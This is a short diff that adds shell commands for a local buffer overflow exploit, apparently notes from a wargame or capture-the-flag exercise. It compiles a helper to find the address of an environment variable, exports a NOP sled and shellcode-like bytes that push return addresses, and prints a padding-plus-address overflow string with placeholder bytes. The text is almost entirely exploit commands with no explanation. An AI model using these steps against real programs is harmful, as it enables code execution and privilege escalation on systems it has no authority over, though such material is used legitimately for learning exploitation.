@@ -1,0 +1,6 @@
+echo '#include <stdlib.h>\n#include <stdio.h>\nint main(void){printf("SHELLCODE=%p\\n",getenv("SHELLCODE"));}' > /tmp/getenv.c
+clang /tmp/getenv.c -o /tmp/getenv
+/tmp/./getenv
+> SHELLCODE=0xXXXXXXXX -> env address
+export SHELLCODE=$(python -c 'import sys; sys.stdout.write(b"\x90" * 256 + b"\x68\xEC\x97\xF8\xF7\x68\xEF\xBE\xAD\xDE\x68\xD0\xAE\xE6\xF7\xC3")')
+python -c 'print(b"\x90" * 0x9c + "\xXX\xXX\xXX\xXX")'
